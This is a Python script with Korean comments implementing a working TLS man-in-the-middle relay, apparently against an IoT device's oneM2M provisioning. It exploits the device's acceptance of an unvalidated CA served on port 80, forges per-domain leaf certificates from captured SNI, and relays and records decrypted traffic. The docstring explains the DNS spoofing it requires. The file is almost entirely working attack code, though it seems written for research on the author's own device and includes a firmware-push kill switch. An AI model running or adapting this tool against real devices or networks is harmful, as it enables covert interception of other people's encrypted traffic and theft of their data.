#!/usr/bin/env python3
"""
CA-swap 투명 릴레이 — 완전 동적. 도메인을 미리 알 필요 없다.

PROTOCOL.md §4에서 실증된 성질을 이용한다:
  - `:80`에서 내려주는 CA는 내용 검증이 없다 — 우리 CA를 그대로 심으면 기기가 새
    신뢰앵커로 설치한다. 단, 연결이 열리자마자 "즉시" 응답해야 한다(요청을 다 읽고
    나서 응답하면 거부됨 — 실측된 타이밍 특성). CA 자체는 도메인과 무관하므로
    이 응답은 항상 똑같다.
  - TLS 포트는 그 CA로 실제 서명된 리프인지만 검증한다 — 우리 CA로 서명한 리프면
    기기가 완전히 신뢰하고 TLS를 맺는다.

동작 방식:
  1) 루트 CA를 한 번만 만들어서 계속 재사용(--cert-dir에 저장).
  2) TLS 연결이 들어오면 ClientHello의 SNI(암호화되기 전 평문 필드)로 어떤
     도메인인지 알아낸다. 그 도메인용 리프 인증서가 없으면 그 자리에서 방금 만든
     CA로 서명해서 만들고(캐싱, 다음부턴 재사용), 그걸로 device 쪽 TLS를 종단한다.
  3) --dns로 지정한 DNS 서버에 그 도메인을 직접 질의해서 실제 IP를 얻는다.
     성공하면 그 IP로(포트는 --port 매핑 참고) 재암호화 연결해서 투명 릴레이.
     --dns를 안 줬거나 조회에 실패하면 업스트림 연결 없이 관찰만 한다(기기가
     보내는 것만 캡처, 가장 안전).

*** SNI를 안 보내는 기기가 실제로 있다(실측됨) ***
임베디드 TLS 스택 중엔 ClientHello에 SNI 확장을 아예 안 넣는 경우가 흔하다. 이러면
이 스크립트가 어떤 인증서를 줘야 할지 알 방법이 없어서 기본적으로 연결을 거부한다.
이럴 땐 --default-domain 으로 SNI 없을 때 쓸 도메인을 지정해야 한다 — 그럼 인증서
발급도, --dns 조회도 전부 그 도메인으로 처리한다.

*** 전제조건: DNS 리다이렉션이 반드시 필요하다 (기기 쪽) ***
기기가 조회하는 도메인의 DNS 응답이 "이 스크립트를 돌리는 머신의 LAN IP"로
나가야 한다 — 라우터/AP의 DNS를 바꾸거나(dnsmasq 등), 기기 트래픽이 지나는
지점에서 DNS 스푸핑을 해야 한다. 이 스크립트 자체는 기기용 DNS 서버가 아니다. 예:

  # dnsmasq.conf — 기기가 붙는 모든 관련 도메인을 이 머신으로
  address=/<대상 도메인>/<이 머신의 LAN IP>

*** --dns는 "진짜" 조회처여야 한다 — 위 dnsmasq와 헷갈리지 말 것 ***
--dns <IP>는 이 스크립트가 실제 업스트림 IP를 알아내려고 직접 질의하는 서버다.
위 dnsmasq(기기용, 조작된 답을 줌)와는 **정반대** 역할 — 절대 같은 서버를 넣지
말 것(넣으면 우리 자신의 조작된 답을 되돌려받아 자기 자신에게 연결하려 하게 됨).
보통은 `8.8.8.8` 같은 공용 DNS나, 대상 도메인의 진짜 권위 서버를 쓴다.

*** 전제조건: 포트 독점 필요 + 관리자 권한 ***
--http-port(기본 80)와 --port로 지정하는 모든 로컬 포트는 이 스크립트가 그
호스트에서 단독으로 bind/listen 해야 한다(공유 불가, 포트당 리스너 하나). 80/443
처럼 1024 미만 포트는 대부분 OS에서 관리자 권한이 필요하다(Linux는 sudo 또는
setcap cap_net_bind_service=+ep).

*** 전제조건: provision.py보다 먼저 떠 있어야 한다 ***
`provision.py reset`으로 기기를 리셋하면 기기는 곧바로 DNS 조회 -> CA 다운로드
-> TLS 핸드셰이크를 시도하고, 실패하면 몇 차례 지수 백오프 후 완전히 재시도를
포기한다(PROTOCOL.md §3). DNS 리다이렉션과 이 스크립트(relay.py serve)가 먼저
떠 있는 상태에서 provision.py로 reset을 트리거해야 한다.

*** 안전 ***
--dns를 지정하면(관찰 모드가 아니면) 실제 서버의 응답을 그대로 기기에 돌려준다.
그 응답에 펌웨어/OTA 지시가 섞여 있으면 그대로 전달된다 — 화면 로그를 보며
수상한 응답이 보이면 즉시 프로세스를 죽일 것.

*** 로그 ***
화면에는 연결/인증서 발급/DNS 조회/릴레이 시작/종료 같은 요약 정보만 실시간으로
찍힌다. 실제 바이트 단위 상세 캡처는 화면이 아니라 --log-dir 아래 파일로 남는다
(연결마다 device_to_upstream.bin / upstream_to_device.bin).

사용:
  # 포트만 열고 관찰만 (가장 안전, --dns 없음). SNI 보내는 기기라면 이걸로 충분.
  python3 relay.py serve -p 443

  # SNI를 안 보내는 기기 — 기본 도메인을 직접 지정
  python3 relay.py serve -p 443 --default-domain <대상 도메인>

  # 여러 포트, 실제 DNS로 업스트림 찾아서 릴레이
  python3 relay.py serve -p 443 -p 8883 --default-domain <대상 도메인> --dns 8.8.8.8

  # 로컬 18883으로 받은 걸 업스트림 8883으로 보내기(비표준 로컬 포트 -> 표준 포트)
  python3 relay.py serve -p 18883:8883 --default-domain <대상 도메인> --dns 8.8.8.8

  python3 relay.py gen-ca --force      # 루트 CA만 강제 재생성
"""

import argparse
import os
import random
import re
import socket
import ssl
import struct
import subprocess
import sys
import tempfile
import threading
import time

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

DEFAULT_CERT_DIR = os.path.join(SCRIPT_DIR, "certs")
DEFAULT_LOG_DIR = os.path.join(SCRIPT_DIR, "captures")

_leaf_lock = threading.Lock()


# ---------------------------------------------------------------------------
# 인증서: CA는 한 번만, 리프는 도메인별로 처음 볼 때 생성 후 캐싱
# ---------------------------------------------------------------------------

def _run_openssl(args):
    try:
        subprocess.run(["openssl"] + args, check=True, capture_output=True)
    except FileNotFoundError:
        sys.exit("openssl 실행 파일을 찾을 수 없습니다. 설치 후 다시 시도하세요.")
    except subprocess.CalledProcessError as e:
        sys.exit(f"openssl 실패: {' '.join(args)}\n{e.stderr.decode(errors='replace')}")


def _ca_paths(cert_dir):
    return os.path.join(cert_dir, "ca.crt"), os.path.join(cert_dir, "ca.key")


def ensure_ca(cert_dir: str, days: int = 3650, force: bool = False):
    ca_crt, ca_key = _ca_paths(cert_dir)
    os.makedirs(cert_dir, exist_ok=True)
    if not force and os.path.exists(ca_crt) and os.path.exists(ca_key):
        print(f"[ca] 기존 루트 CA 재사용: {ca_crt}")
        return ca_crt, ca_key

    print(f"[ca] 새 루트 CA 생성: {ca_crt}")
    with tempfile.TemporaryDirectory() as td:
        ca_cnf = os.path.join(td, "ca.cnf")
        with open(ca_cnf, "w") as f:
            f.write(
                "[req]\ndistinguished_name = dn\nx509_extensions = ext\nprompt = no\n"
                "[dn]\nC = KR\nO = Local MITM CA\nCN = Local MITM Root CA\n"
                "[ext]\nbasicConstraints = critical,CA:TRUE\n"
                "keyUsage = critical,digitalSignature,keyCertSign,cRLSign\n"
                "subjectKeyIdentifier = hash\n"
            )
        _run_openssl(["genrsa", "-out", ca_key, "2048"])
        _run_openssl(["req", "-new", "-x509", "-key", ca_key, "-out", ca_crt,
                      "-days", str(days), "-config", ca_cnf])
    return ca_crt, ca_key


def _sanitize(domain: str) -> str:
    return "".join(c if (c.isalnum() or c in ".-") else "_" for c in domain)


def get_or_make_leaf(cert_dir: str, domain: str, days: int = 825):
    """domain 하나짜리 SAN 리프를 CA로 서명해서 만들고(없으면), (chain_pem, key) 경로를 돌려준다."""
    leaf_dir = os.path.join(cert_dir, "leaves")
    os.makedirs(leaf_dir, exist_ok=True)
    safe = _sanitize(domain)
    leaf_crt = os.path.join(leaf_dir, f"{safe}.crt")
    leaf_key = os.path.join(leaf_dir, f"{safe}.key")
    chain_pem = os.path.join(leaf_dir, f"{safe}.chain.pem")

    with _leaf_lock:
        if os.path.exists(chain_pem) and os.path.exists(leaf_key):
            return chain_pem, leaf_key

        ca_crt, ca_key = ensure_ca(cert_dir)
        print(f"[cert] {domain} 용 리프 새로 생성")
        with tempfile.TemporaryDirectory() as td:
            leaf_cnf = os.path.join(td, "leaf.cnf")
            with open(leaf_cnf, "w") as f:
                f.write(
                    "[req]\ndistinguished_name = dn\nreq_extensions = ext\nprompt = no\n"
                    f"[dn]\nCN = {domain}\n"
                    "[ext]\nbasicConstraints = CA:FALSE\n"
                    "keyUsage = critical,digitalSignature,keyEncipherment\n"
                    "extendedKeyUsage = serverAuth\nsubjectAltName = @san\n"
                    f"[san]\nDNS.1 = {domain}\n"
                )
            leaf_csr = os.path.join(td, "leaf.csr")
            _run_openssl(["genrsa", "-out", leaf_key, "2048"])
            _run_openssl(["req", "-new", "-key", leaf_key, "-out", leaf_csr, "-config", leaf_cnf])
            _run_openssl(["x509", "-req", "-in", leaf_csr, "-CA", ca_crt, "-CAkey", ca_key,
                          "-CAcreateserial", "-out", leaf_crt, "-days", str(days),
                          "-extfile", leaf_cnf, "-extensions", "ext"])
        with open(chain_pem, "wb") as out:
            out.write(open(leaf_crt, "rb").read())
            out.write(open(ca_crt, "rb").read())
        return chain_pem, leaf_key


def cmd_gen_ca(args):
    ensure_ca(args.cert_dir, force=args.force)
    return 0


# ---------------------------------------------------------------------------
# 최소 DNS 클라이언트 (지정한 서버에 직접 A 레코드 질의, 표준 라이브러리만)
# ---------------------------------------------------------------------------

def _encode_qname(domain: str) -> bytes:
    out = b""
    for part in domain.strip(".").split("."):
        out += bytes([len(part)]) + part.encode()
    return out + b"\x00"


def _skip_name(data: bytes, offset: int) -> int:
    while True:
        length = data[offset]
        if length == 0:
            return offset + 1
        if length & 0xC0 == 0xC0:
            return offset + 2
        offset += 1 + length


def _parse_name(data: bytes, offset: int) -> str:
    labels = []
    jumped = False
    while True:
        length = data[offset]
        if length == 0:
            offset += 1
            break
        if length & 0xC0 == 0xC0:
            pointer = ((length & 0x3F) << 8) | data[offset + 1]
            if not jumped:
                jumped = True
            offset = pointer
            continue
        offset += 1
        labels.append(data[offset:offset + length].decode(errors="replace"))
        offset += length
    return ".".join(labels)


def _dns_query_once(domain: str, dns_server: str, timeout: float):
    qid = random.randint(0, 0xFFFF)
    header = struct.pack(">HHHHHH", qid, 0x0100, 1, 0, 0, 0)
    question = _encode_qname(domain) + struct.pack(">HH", 1, 1)  # A, IN
    query = header + question
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.settimeout(timeout)
        s.sendto(query, (dns_server, 53))
        data, _ = s.recvfrom(4096)
    if len(data) < 12:
        return None, None
    rid, flags, qdcount, ancount, _, _ = struct.unpack(">HHHHHH", data[:12])
    if rid != qid:
        return None, None
    offset = 12
    for _ in range(qdcount):
        offset = _skip_name(data, offset)
        offset += 4
    ips, cname = [], None
    for _ in range(ancount):
        offset = _skip_name(data, offset)
        rtype, rclass, ttl, rdlen = struct.unpack(">HHIH", data[offset:offset + 10])
        offset += 10
        if rtype == 1 and rclass == 1 and rdlen == 4:
            ips.append(".".join(str(b) for b in data[offset:offset + 4]))
        elif rtype == 5:
            cname = _parse_name(data, offset)
        offset += rdlen
    return ips, cname


def resolve_via_dns(domain: str, dns_server: str, timeout: float = 3.0, max_hops: int = 5):
    """--dns 서버에 직접 A 레코드 질의(표준 라이브러리 raw UDP). CNAME은 따라감.
    실패하면 None."""
    current = domain
    for _ in range(max_hops):
        try:
            ips, cname = _dns_query_once(current, dns_server, timeout)
        except Exception:
            return None
        if ips:
            return ips[0]
        if cname:
            current = cname
            continue
        return None
    return None


# ---------------------------------------------------------------------------
# 로깅
# ---------------------------------------------------------------------------

def ts():
    return time.strftime("%H:%M:%S")


def log(cid, msg):
    print(f"[{ts()}] [{cid}] {msg}")
    sys.stdout.flush()


# ---------------------------------------------------------------------------
# :80 — 즉시 CA 응답 (도메인 무관, 요청을 기다리지 않음, 타이밍 민감)
# ---------------------------------------------------------------------------

def drain(client, cid):
    try:
        client.settimeout(2.0)
        buf = b""
        while True:
            try:
                d = client.recv(65536)
            except socket.timeout:
                break
            if not d:
                break
            buf += d
    except Exception:
        pass


def handle80(client, addr, ca_pem: bytes):
    cid = f":80-{addr[0]}:{addr[1]}-{int(time.time())}"
    log(cid, f"{addr[0]}에서 :80 연결")
    date = time.strftime("%a, %d %b %Y %H:%M:%S GMT", time.gmtime())
    headers = (
        b"HTTP/1.1 200 OK\r\n"
        b"Date: " + date.encode() + b"\r\n"
        b"Server: Apache\r\n"
        b"Content-Disposition: attachment;filename=oneM2M_HTTP_CA.pem\r\n"
        b"Content-Length: " + str(len(ca_pem)).encode() + b"\r\n"
        b"Content-Type: application/xml;charset=UTF-8\r\n"
        b"\r\n"
    )
    threading.Thread(target=drain, args=(client, cid), daemon=True).start()
    try:
        client.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        client.sendall(headers + ca_pem)
        log(cid, f"인증서(CA) 제공함 ({len(headers) + len(ca_pem)}B)")
    except Exception as e:
        log(cid, f"전송 실패: {e}")
    time.sleep(0.3)
    try:
        client.close()
    except Exception:
        pass
    log(cid, "연결 종료")


def bind_listener(listen_host: str, port: int) -> socket.socket:
    """지금(메인 스레드에서) bind — 실패하면 스레드 안이 아니라 여기서 바로 죽는다."""
    ls = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ls.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        ls.bind((listen_host, port))
    except OSError as e:
        sys.exit(f"{listen_host}:{port} bind 실패: {e} — 다른 프로세스가 이 포트를 쓰고 있거나 "
                 f"(포트 공유 불가, 리스너는 포트당 하나뿐) 권한이 부족할 수 있음"
                 f"(1024 미만 포트는 관리자 권한 필요)")
    ls.listen(16)
    return ls


def listen80(ls: socket.socket, ca_pem):
    print(f"listening {ls.getsockname()[0]}:{ls.getsockname()[1]} — CA 즉시 응답")
    sys.stdout.flush()
    while True:
        c, a = ls.accept()
        threading.Thread(target=handle80, args=(c, a, ca_pem), daemon=True).start()


# ---------------------------------------------------------------------------
# TLS 포트 — SNI로 도메인 학습 -> 리프 즉석 발급 -> (있으면) DNS로 실제 IP 찾아 릴레이
# ---------------------------------------------------------------------------

# --- TEMP-FWR-KILL: whitelist된 현재 버전 파일명은 통과, 그 외 .fwr 또는 url 필드가 채워진
# 응답은 위험(OTA push)으로 보고 차단(임시, 나중에 삭제) ---
_FWR_WHITELIST = {b"MTTL-W01_V1.0.60.fwr"}
_FWR_RE = re.compile(rb'[\w./-]*\.fwr', re.IGNORECASE)
_URL_RE = re.compile(rb'"url"\s*:\s*"([^"]+)"')


def _fwr_kill_reason(data: bytes):
    for m in _FWR_RE.finditer(data):
        if m.group(0) not in _FWR_WHITELIST:
            return f".fwr 파일명({m.group(0).decode(errors='replace')})"
    m = _URL_RE.search(data)
    if m and m.group(1):
        return f"url 필드({m.group(1).decode(errors='replace')})"
    return None
# --- TEMP-FWR-KILL helper end ---


def pump(src, dst, label, cid, fp):
    total = 0
    try:
        while True:
            data = src.recv(65536)
            if not data:
                break
            total += len(data)
            if fp:
                fp.write(data)
                fp.flush()
            log(cid, f"{label} +{len(data)}B (누적 {total}B)")
            if label == "upstream->device":
                reason = _fwr_kill_reason(data)
                if reason:
                    log(cid, f"!!! {label}에서 위험 신호 감지({reason}) — 기기로 전달하지 않고 프로세스 종료 !!!")
                    os._exit(1)
            if dst is not None:
                dst.sendall(data)
    except Exception as e:
        log(cid, f"{label} 종료: {e}")
    finally:
        if dst is not None:
            try:
                dst.shutdown(socket.SHUT_WR)
            except Exception:
                pass
    return total


def handle_tls(raw_client, addr, local_port, remote_port, cert_dir, dns_server, port_domain, default_domain, log_dir):
    cid = f":{local_port}-{addr[0]}:{addr[1]}-{int(time.time())}"
    log(cid, f"{addr[0]}에서 :{local_port} 연결(TLS)")

    sni_holder = {}

    def sni_cb(sslsock, server_hostname, sslctx):
        domain = server_hostname
        if not domain:
            fallback = port_domain or default_domain
            if not fallback:
                log(cid, f"SNI 없음 — :{local_port}용 기본 도메인이 없어 인증서 발급 불가"
                         f"(포트별 도메인도 --default-domain도 없음), 연결 거부")
                return
            domain = fallback
            log(cid, f"SNI 없음 — :{local_port} 기본 도메인({fallback}) 사용")
        sni_holder["value"] = domain
        chain_pem, leaf_key = get_or_make_leaf(cert_dir, domain)
        domain_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        domain_ctx.load_cert_chain(certfile=chain_pem, keyfile=leaf_key)
        sslsock.context = domain_ctx

    base_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    base_ctx.sni_callback = sni_cb
    try:
        dev_tls = base_ctx.wrap_socket(raw_client, server_side=True)
    except Exception as e:
        log(cid, f"TLS 핸드셰이크 실패: {e}")
        raw_client.close()
        return

    domain = sni_holder.get("value")
    log(cid, f"TLS 성공(도메인={domain!r}, cipher={dev_tls.cipher()}) — 기기가 인증서를 신뢰함")

    up_tls = None
    if dns_server and domain:
        real_ip = resolve_via_dns(domain, dns_server)
        if real_ip:
            log(cid, f"DNS({dns_server})로 {domain} 조회 -> {real_ip}")
            try:
                raw_up = socket.create_connection((real_ip, remote_port), timeout=15)
                raw_up.settimeout(None)  # connect용 타임아웃일 뿐 — MQTT는 무통신 idle이 흔해서 이후엔 blocking으로 풀어줌
                up_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                up_ctx.check_hostname = False
                up_ctx.verify_mode = ssl.CERT_NONE
                up_tls = up_ctx.wrap_socket(raw_up, server_hostname=domain)
                log(cid, f"{real_ip}:{remote_port}(SNI={domain})로 릴레이 시작")
            except Exception as e:
                log(cid, f"업스트림({real_ip}:{remote_port}) 연결 실패: {e} — 관찰 전용으로 계속")
                up_tls = None
        else:
            log(cid, f"DNS({dns_server})로 {domain} 조회 실패 — 관찰 전용으로 계속")
    elif not dns_server:
        log(cid, "관찰 전용(--dns 없음) — 업스트림에 연결하지 않음")

    os.makedirs(log_dir, exist_ok=True)
    fp_dev = open(os.path.join(log_dir, f"{cid}_device_to_upstream.bin"), "wb")
    fp_up = open(os.path.join(log_dir, f"{cid}_upstream_to_device.bin"), "wb") if up_tls else None

    threads = [threading.Thread(target=pump, args=(dev_tls, up_tls, "device->upstream", cid, fp_dev))]
    if up_tls is not None:
        threads.append(threading.Thread(target=pump, args=(up_tls, dev_tls, "upstream->device", cid, fp_up)))
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    fp_dev.close()
    if fp_up:
        fp_up.close()
    for s in (dev_tls, up_tls):
        if s is not None:
            try:
                s.close()
            except Exception:
                pass
    log(cid, "연결 종료")


def listen_tls(ls: socket.socket, local_port, remote_port, cert_dir, dns_server, port_domain, default_domain, log_dir):
    domain_note = f", SNI 없을 때 기본 도메인={port_domain}" if port_domain else ""
    print(f"listening {ls.getsockname()[0]}:{local_port} — device TLS 종단"
          f"{'' if local_port == remote_port else f' (업스트림 포트는 :{remote_port})'}{domain_note}")
    sys.stdout.flush()
    while True:
        c, a = ls.accept()
        threading.Thread(
            target=handle_tls,
            args=(c, a, local_port, remote_port, cert_dir, dns_server, port_domain, default_domain, log_dir),
            daemon=True,
        ).start()


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def parse_ports(specs) -> dict:
    """-p를 반복(또는 콤마 구분)으로 받는다. 각 항목은 'PORT', 'LOCAL:REMOTE',
    또는 'LOCAL:REMOTE:DOMAIN'(그 포트에서 SNI 없을 때 쓸 기본 도메인) 형식.
    돌려주는 값: {local: {"remote": int, "domain": str|None}}."""
    ports = {}
    for spec in (specs or []):
        for token in spec.split(","):
            token = token.strip()
            if not token:
                continue
            parts = token.split(":")
            domain = None
            try:
                if len(parts) == 1:
                    local = remote = int(parts[0])
                elif len(parts) == 2:
                    local, remote = int(parts[0]), int(parts[1])
                elif len(parts) == 3:
                    local, remote = int(parts[0]), int(parts[1])
                    domain = parts[2]
                else:
                    raise ValueError
            except ValueError:
                sys.exit(f"--port 형식 오류: {token!r} ('PORT', 'LOCAL:REMOTE' 또는 'LOCAL:REMOTE:DOMAIN')")
            ports[local] = {"remote": remote, "domain": domain}
    if not ports:
        sys.exit("-p/--port로 포트를 하나 이상 지정하세요. 예: -p 443")
    return ports


def cmd_serve(args):
    ports = parse_ports(args.port)

    # bind는 여기(메인 스레드)에서 미리 해서, 실패하면 스레드 없이 바로 죽는다.
    http_ls = bind_listener(args.listen_host, args.http_port)
    tls_listeners = {local: bind_listener(args.listen_host, local) for local in ports}

    ca_crt, _ = ensure_ca(args.cert_dir)
    with open(ca_crt, "rb") as f:
        ca_pem = f.read()

    print("=" * 70)
    print("DNS 리다이렉션 확인: 대상 도메인 조회가 이 머신으로 오고 있어야 동작합니다.")
    print("  (예: dnsmasq) address=/<대상 도메인>/<이 머신의 LAN IP>")
    port_summary = {local: (cfg["remote"], cfg["domain"]) for local, cfg in ports.items()}
    print(f"리슨: :{args.http_port}(CA 응답) / TLS {port_summary} (local: (remote, 포트별기본도메인))")
    if args.default_domain:
        print(f"SNI 없는 연결의 기본 도메인: {args.default_domain}")
    if args.dns:
        print(f"업스트림: --dns {args.dns} 로 실제 IP를 조회해서 릴레이")
        print(f"  (주의: {args.dns}가 기기용 DNS 리다이렉션과 같은 서버면 안 됨)")
    else:
        print("업스트림: 없음(--dns 미지정) — 관찰 전용, 기기가 보내는 것만 캡처")
    print(f"캡처 저장 위치: {args.log_dir}")
    print("=" * 70)
    sys.stdout.flush()

    threads = [threading.Thread(target=listen80, args=(http_ls, ca_pem), daemon=True)]
    for local, cfg in ports.items():
        threads.append(threading.Thread(
            target=listen_tls,
            args=(tls_listeners[local], local, cfg["remote"], args.cert_dir, args.dns,
                  cfg["domain"], args.default_domain, args.log_dir),
            daemon=True,
        ))
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    return 0


def main():
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = p.add_subparsers(dest="command", required=True)

    p_gen = sub.add_parser("gen-ca", help="루트 CA 생성(이미 있으면 재사용, --force로 강제 재생성)")
    p_gen.add_argument("--cert-dir", default=DEFAULT_CERT_DIR, help="CA/리프 저장 위치")
    p_gen.add_argument("--force", action="store_true")
    p_gen.set_defaults(func=cmd_gen_ca)

    p_serve = sub.add_parser("serve", help="릴레이 서버 실행")
    p_serve.add_argument("--cert-dir", default=DEFAULT_CERT_DIR,
                          help="CA/리프 저장 위치(없으면 자동 생성, 있으면 재사용)")
    p_serve.add_argument("--listen-host", default="0.0.0.0")
    p_serve.add_argument("--http-port", type=int, default=80, help="CA를 즉시 응답할 평문 포트(기본 80)")
    p_serve.add_argument(
        "-p", "--port", action="append", default=None,
        help="TLS로 종단할 로컬 포트. 반복 또는 콤마로 여러 개. "
             "'PORT'(로컬=업스트림 같은 포트), 'LOCAL:REMOTE'(예: 18883:8883), 또는 "
             "'LOCAL:REMOTE:DOMAIN'(그 포트에서 SNI 없을 때 쓸 기본 도메인 지정, "
             "--default-domain보다 우선). 예: -p 443 -p 18883:18883:brk2.onem2m.uplus.co.kr",
    )
    p_serve.add_argument(
        "--dns", default=None,
        help="실제 업스트림 IP를 조회할 DNS 서버(예: 8.8.8.8). 안 주면 업스트림에 "
             "전혀 연결하지 않고 관찰만 함(가장 안전). 기기용 DNS 리다이렉션 서버와 "
             "절대 같으면 안 됨.",
    )
    p_serve.add_argument(
        "--default-domain", default=None,
        help="ClientHello에 SNI가 없는 기기를 위한 전역 기본 도메인(인증서 발급 + --dns 조회에 "
             "그대로 씀). -p로 그 포트의 도메인을 따로 지정하지 않은 경우의 fallback. "
             "SNI도 없고 이것도 없고 포트별 도메인도 없으면 연결을 거부한다.",
    )
    p_serve.add_argument("--log-dir", default=DEFAULT_LOG_DIR)
    p_serve.set_defaults(func=cmd_serve)

    args = p.parse_args()
    sys.exit(args.func(args) or 0)


if __name__ == "__main__":
    main()
